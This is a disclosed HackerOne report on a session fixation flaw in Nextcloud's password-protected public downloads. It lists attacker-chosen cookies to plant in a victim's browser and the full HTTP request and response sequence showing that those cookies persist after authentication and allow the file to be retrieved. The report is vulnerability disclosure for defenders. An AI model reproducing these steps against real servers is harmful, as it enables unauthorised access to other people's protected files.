# Session fixation in password protected public download.

## Report Details
- **Report ID**: 237184
- **URL**: https://hackerone.com/reports/237184
- **State**: Closed
- **Severity**: low
- **Submitted**: 2017-06-06T09:17:29.211Z
- **Disclosed**: 2018-10-25T10:26:31.557Z

## Reporter
- **Username**: frankspierings
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
Public downloads protected with a password are vulnerable to a session fixation attack. This finding was discovered during a penetration test of NextCloud version 10.0.2.7.

1) Pre-provision a victim with the attacker controlled cookie values:

Firefox cookie manager:
```
www.clouddrive.example	FALSE	%2F	FALSE	0	ocu1w9tvnra8	AAAAAAAAAAAAAAAAAAAAAAAAA1
www.clouddrive.example	FALSE	%2F	TRUE	0	oc_sessionPassphrase	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1
www.clouddrive.example	FALSE	%2F	TRUE	4133980799	__Host-nc_sameSiteCookielax	TRUE
www.clouddrive.example	FALSE	%2F	TRUE	4133980799	__Host-nc_sameSiteCookiestrict	TRUE 
```

2) The victim receives a public download link for a file. This resource is password protected by NextCloud. 
Downloading the file consists of several requests. Notice that all requests are being performed with the pre-provisioned cookies. These cookies are never replaced after successful authentication.

Request:
```
GET /index.php/s/Ezn3dOeZ28Hph57 HTTP/1.1
Host: www.clouddrive.example
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cookie: __Host-nc_sameSiteCookielax=TRUE; __Host-nc_sameSiteCookiestrict=TRUE; ocu1w9tvnra8=AAAAAAAAAAAAAAAAAAAAAAAAA1; oc_sessionPassphrase=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1
Connection: close
Upgrade-Insecure-Requests: 1
```

Response:
```
HTTP/1.1 302 Found
Date: Tue, 06 Jun 2017 08:26:52 GMT
Server: Apache
X-Powered-By: PHP/7.0.17
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-eval' 'nonce-a3N2dzQremRnTmJLdytUaWJoZkEvenVZUHYwRjhDZVFUT2dacUNyb0s0ND06MnIrS3pMU3Y2T0MvcXFpb0ZGNlB5bFgvRDdSZnNtN25QN3hmNzFpcVc4TT0='; style-src 'self' 'unsafe-inline'; frame-src *; img-src * data: blob:; font-src 'self' data:; media-src *; connect-src *
Set-Cookie: __Host-nc_sameSiteCookielax=true; path=/; httponly;secure; expires=Fri, 31-Dec-2100 23:59:59 GMT; SameSite=lax
Set-Cookie: __Host-nc_sameSiteCookiestrict=true; path=/; httponly;secure; expires=Fri, 31-Dec-2100 23:59:59 GMT; SameSite=strict
Location: /index.php/s/Ezn3dOeZ28Hph57
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
X-Robots-Tag: none
X-Frame-Options: SAMEORIGIN
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Connection: close
Content-Type: text/html; charset=UTF-8
Strict-Transport-Security: max-age=16000000; includeSubDomains; preload;
Content-Length: 0
```

Request:
```
GET /index.php/s/Ezn3dOeZ28Hph57 HTTP/1.1
Host: www.clouddrive.example
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cookie: __Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; ocu1w9tvnra8=AAAAAAAAAAAAAAAAAAAAAAAAA1; oc_sessionPassphrase=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1
Connection: close
Upgrade-Insecure-Requests: 1
```

Response:
```
HTTP/1.1 303 See Other
Date: Tue, 06 Jun 2017 08:26:54 GMT
Server: Apache
X-Powered-By: PHP/7.0.17
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Cache-Control: no-cache, must-revalidate
Content-Security-Policy: default-src 'none';script-src 'nonce-S1pwTXU1dEdaSEVkSFZPeENMR01jbVBxcGZLSmJTaC9CS0lpNHZtOGNnWT06WWU0MmxNTTBERWRvZEIvN2N2akRSdzJObEx2VEwyRUlkL1prcFl2K0Frcz0=' 'unsafe-eval';style-src 'self' 'unsafe-inline';img-src 'self' data: blob:;font-src 'self';connect-src 'self';media-src 'self'
Location: /index.php/s/Ezn3dOeZ28Hph57/authenticate
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
X-Robots-Tag: none
X-Frame-Options: SAMEORIGIN
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Connection: close
Content-Type: text/html; charset=UTF-8
Strict-Transport-Security: max-age=16000000; includeSubDomains; preload;
Content-Length: 0
```

Request:
```
GET /index.php/s/Ezn3dOeZ28Hph57/authenticate HTTP/1.1
Host: www.clouddrive.example
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cookie: __Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; ocu1w9tvnra8=AAAAAAAAAAAAAAAAAAAAAAAAA1; oc_sessionPassphrase=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1
Connection: close
Upgrade-Insecure-Requests: 1
```

Response:
```
HTTP/1.1 200 OK
Date: Tue, 06 Jun 2017 08:26:56 GMT
Server: Apache
X-Powered-By: PHP/7.0.17
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Cache-Control: no-cache, must-revalidate
Content-Security-Policy: default-src 'none';script-src 'nonce-NnBNTW9hUjVmeWJUNzJkdm1YaDFJQUhzV2hnL2VqVEgrdHlDSmJ5Rzc0dz06b3VkMmp2d0xGeENtaGlzbDR6RTZGVytMYTFGbE9IMndpWWpFWXM3RW44RT0=' 'unsafe-eval';style-src 'self' 'unsafe-inline';img-src 'self' data: blob:;font-src 'self';connect-src 'self';media-src 'self'
Content-Length: 17294
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
X-Robots-Tag: none
X-Frame-Options: SAMEORIGIN
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Connection: close
Content-Type: text/html; charset=UTF-8
Strict-Transport-Security: max-age=16000000; includeSubDomains; preload;
```

Now the authentication takes place:

Request:
```
POST /index.php/s/Ezn3dOeZ28Hph57/authenticate HTTP/1.1
Host: www.clouddrive.example
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 144
Cookie: __Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; ocu1w9tvnra8=AAAAAAAAAAAAAAAAAAAAAAAAA1; oc_sessionPassphrase=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1
Connection: close
Upgrade-Insecure-Requests: 1

requesttoken=6pMMoaR5fybT72dvmXh1IAHsWhg%2FejTH%2BtyCJbyG74w%3D%3Aoud2jvwLFxCmhisl4zE6FW%2BLa1FlOH2wiYjEYs7En8E%3D&password=SessionFixation01%21
```

Response:
```
HTTP/1.1 303 See Other
Date: Tue, 06 Jun 2017 08:27:10 GMT
Server: Apache
X-Powered-By: PHP/7.0.17
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Cache-Control: no-cache, must-revalidate
Content-Security-Policy: default-src 'none';script-src 'nonce-M3hVNVRMdTJkYWZGNTFoQVN4VHcrRTZ6b2dHUkg0SnQrM0w4Z01VNU1MST06bDJGRFkrUEVIWkd3amhRS01WMi96U0RVazBqTFhjc2FpQ2E2eDdkN1FQOD0=' 'unsafe-eval';style-src 'self' 'unsafe-inline';img-src 'self' data: blob:;font-src 'self';connect-src 'self';media-src 'self'
Location: /index.php/s/Ezn3dOeZ28Hph57
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
X-Robots-Tag: none
X-Frame-Options: SAMEORIGIN
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Connection: close
Content-Type: text/html; charset=UTF-8
Strict-Transport-Security: max-age=16000000; includeSubDomains; preload;
Content-Length: 0
```

Request:
```
GET /index.php/s/Ezn3dOeZ28Hph57 HTTP/1.1
Host: www.clouddrive.example
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cookie: __Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; ocu1w9tvnra8=AAAAAAAAAAAAAAAAAAAAAAAAA1; oc_sessionPassphrase=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1
Connection: close
Upgrade-Insecure-Requests: 1
```

Response Headers:
```
HTTP/1.1 200 OK
Date: Tue, 06 Jun 2017 08:27:12 GMT
Server: Apache
X-Powered-By: PHP/7.0.17
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Cache-Control: no-cache, must-revalidate
Content-Security-Policy: default-src 'none';script-src 'nonce-aGcyeFVwaml6OGprZWpNbWdBUFVvMkMyM0p0WVpWUXdTNkpPKzlkZHZPND06em5uTGZjQ1FwLzZSRTM5cytrcWJsZzdSN2RJQ0p4MUhPUFlJdktVZnpLTT0=' 'unsafe-eval';style-src 'self' 'unsafe-inline';img-src 'self' data: blob:;font-src 'self';connect-src 'self';media-src 'self';frame-src 'self'
Content-Length: 20599
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
X-Robots-Tag: none
X-Frame-Options: SAMEORIGIN
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Connection: close
Content-Type: text/html; charset=UTF-8
Strict-Transport-Security: max-age=16000000; includeSubDomains; preload;
```

Clicking the direct download button will generate the following:

Request:
```
GET /index.php/s/Ezn3dOeZ28Hph57/download HTTP/1.1
Host: www.clouddrive.example
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cookie: __Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; ocu1w9tvnra8=AAAAAAAAAAAAAAAAAAAAAAAAA1; oc_sessionPassphrase=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1
Connection: close
Upgrade-Insecure-Requests: 1
```

Response:
```
HTTP/1.1 200 OK
Date: Tue, 06 Jun 2017 08:29:11 GMT
Server: Apache
X-Powered-By: PHP/7.0.17
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-eval' 'nonce-emRneTV0RDFQQXRibTlqY0phbUJsTm5QcTJSSGZ1RFVQWFgxZTROUFpyUT06aGF4SXlZaUhWRDB1OHBTV1grRE9vYmVvbWkwZFBLbWpUaUd6UFBFTkZ2az0='; style-src 'self' 'unsafe-inline'; frame-src *; img-src * data: blob:; font-src 'self' data:; media-src *; connect-src *
Content-Disposition: attachment; filename*=UTF-8''Public%20Download%20-%20Session%20Fixation%20Example.txt; filename="Public%20Download%20-%20Session%20Fixation%20Example.txt"
OC-ETag: "5936650b3d865"
Last-Modified: Tue, 06 Jun 2017 08:17:15 GMT
ETag: "5936650b3d865"
Content-Length: 54
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
X-Robots-Tag: none
X-Frame-Options: SAMEORIGIN
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Content-Type: text/plain;charset=UTF-8
Strict-Transport-Security: max-age=16000000; includeSubDomains; preload;

This file could be acquired through session fixation.
```

3) The attacker needs the following to acquire the file:
- Pre-provision the cookies in the victim's browser.
- Know the token to the public file.

## Attachments
No attachments
